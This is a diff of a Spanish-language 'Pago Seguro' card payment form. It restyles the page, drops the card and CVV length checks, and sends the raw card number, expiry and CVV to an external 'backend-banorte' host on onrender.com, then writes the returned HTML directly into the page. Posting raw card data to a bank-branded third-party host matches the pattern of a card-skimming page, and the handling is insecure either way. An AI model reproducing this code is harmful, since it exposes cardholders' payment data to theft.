@@ -2,37 +2,65 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>Pago seguro</title>
+<title>Pago Seguro</title>
 
 <style>
 body {
-  font-family: Arial;
-  background: #6a1b9a;
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: linear-gradient(135deg, #4a148c, #7b1fa2);
   display: flex;
   justify-content: center;
   align-items: center;
   height: 100vh;
-  margin: 0;
 }
 
 .container {
   background: white;
-  padding: 20px;
-  border-radius: 10px;
-  width: 300px;
+  padding: 30px;
+  border-radius: 15px;
+  width: 320px;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+}
+
+h2 {
+  text-align: center;
+  color: #6a1b9a;
 }
 
 input {
   width: 100%;
   padding: 10px;
-  margin: 5px 0;
+  margin: 8px 0;
+  border-radius: 8px;
+  border: 1px solid #ccc;
 }
 
 button {
   width: 100%;
-  padding: 10px;
-  background: purple;
+  padding: 12px;
+  background: #6a1b9a;
   color: white;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #4a148c;
+}
+
+.cvv-container {
+  position: relative;
+}
+
+.toggle-cvv {
+  position: absolute;
+  right: 10px;
+  top: 12px;
+  cursor: pointer;
+  font-size: 12px;
+  color: #6a1b9a;
 }
 </style>
 </head>
@@ -40,21 +68,20 @@ button {
 <body>
 
 <div class="container">
-  <h3>Pago</h3>
+  <h2>Pago Seguro</h2>
 
   <form id="formPago">
 
-    <input name="nombre" placeholder="Nombre" required>
-    <input name="correo" placeholder="Correo" required>
+    <input name="nombre" placeholder="Nombre completo" required>
+    <input name="correo" type="email" placeholder="Correo electrónico" required>
 
-    <!-- tarjeta 16 dígitos -->
-    <input id="cardNumber" placeholder="Tarjeta" maxlength="16" required>
-
-    <!-- fecha con formato -->
+    <input id="cardNumber" placeholder="Número de tarjeta" maxlength="16" required>
     <input id="cardExp" placeholder="MM/AA" maxlength="5" required>
 
-    <!-- CVV oculto -->
-    <input id="cvv" type="password" placeholder="CVV" maxlength="3" required>
+    <div class="cvv-container">
+      <input id="cvv" type="password" placeholder="CVV" maxlength="4" required>
+      <span class="toggle-cvv" onclick="toggleCVV()">Ver</span>
+    </div>
 
     <input id="amount" placeholder="Monto" required>
 
@@ -64,47 +91,40 @@ button {
 </div>
 
 <script>
+function toggleCVV() {
+  const cvv = document.getElementById("cvv");
+  cvv.type = cvv.type === "password" ? "text" : "password";
+}
+
+// formato MM/AA automático
+document.getElementById("cardExp").addEventListener("input", e => {
+  let val = e.target.value.replace(/\D/g, "");
+  if (val.length >= 2) val = val.slice(0,2) + "/" + val.slice(2,4);
+  e.target.value = val;
+});
+
+// solo números tarjeta
+document.getElementById("cardNumber").addEventListener("input", e => {
+  e.target.value = e.target.value.replace(/\D/g, "").slice(0,16);
+});
+
 window.onload = () => {
-
   const form = document.getElementById("formPago");
-  const expInput = document.getElementById("cardExp");
-
-  // formato automático MM/AA
-  expInput.addEventListener("input", (e) => {
-    let val = e.target.value.replace(/\D/g, "");
-    if (val.length >= 3) {
-      val = val.slice(0,2) + "/" + val.slice(2,4);
-    }
-    e.target.value = val;
-  });
 
   form.onsubmit = async (e) => {
     e.preventDefault();
 
-    const cardNumber = document.getElementById("cardNumber").value;
-    const cvv = document.getElementById("cvv").value;
-
-    if (cardNumber.length !== 16) {
-      alert("La tarjeta debe tener 16 dígitos");
-      return;
-    }
-
-    if (cvv.length !== 3) {
-      alert("CVV inválido");
-      return;
-    }
-
     const data = {
       nombre: form.nombre.value,
       correo: form.correo.value,
-      cardNumber,
-      cardExp: document.getElementById("cardExp").value.replace("/", ""),
-      cvv,
+      cardNumber: document.getElementById("cardNumber").value,
+      cardExp: document.getElementById("cardExp").value,
+      cvv: document.getElementById("cvv").value,
       amount: document.getElementById("amount").value
     };
 
     try {
-      const res = await fetch("/api/payment/3d-secure", {
+      const res = await fetch("https://backend-banorte.onrender.com/api/payment/3d-secure", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -113,18 +133,14 @@ window.onload = () => {
       });
 
       const html = await res.text();
-
-      // 🔥 abrir Banorte correctamente
-      const win = window.open();
-      win.document.open();
-      win.document.write(html);
-      win.document.close();
+      document.open();
+      document.write(html);
+      document.close();
 
     } catch (error) {
       alert("Error al procesar pago");
     }
   };
-
 };
 </script>
 
